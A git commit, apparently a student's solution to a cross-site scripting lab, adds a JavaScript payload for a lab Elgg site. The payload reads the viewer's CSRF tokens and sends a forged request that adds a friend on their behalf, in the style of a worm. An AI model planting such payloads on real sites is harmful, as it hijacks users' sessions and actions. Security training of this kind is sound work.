e1ed7022f2b7dcb59a250f688a44b6b81a9221ba
Yumingyuan <timdavid@vip.qq.com>
2019-04-18 10:31:07 -0400

    finsh 5.3's Task 2

---
+++ 5.3_Task2.js
@@ -0,0 +1,16 @@
+<script type="text/javascript"> 
+window.onload = function () {
+	var Ajax=null;
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;							
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;				
+	//Construct the HTTP request to add Samy as a friend. 
+	var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=44"+ts+token;	//friend=44 is alice
+	//Create and send Ajax request to add friend 
+	Ajax=new XMLHttpRequest(); 
+	Ajax.open("GET",sendurl,true); 
+	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); 
+	Ajax.send();
+}
+</script>
+
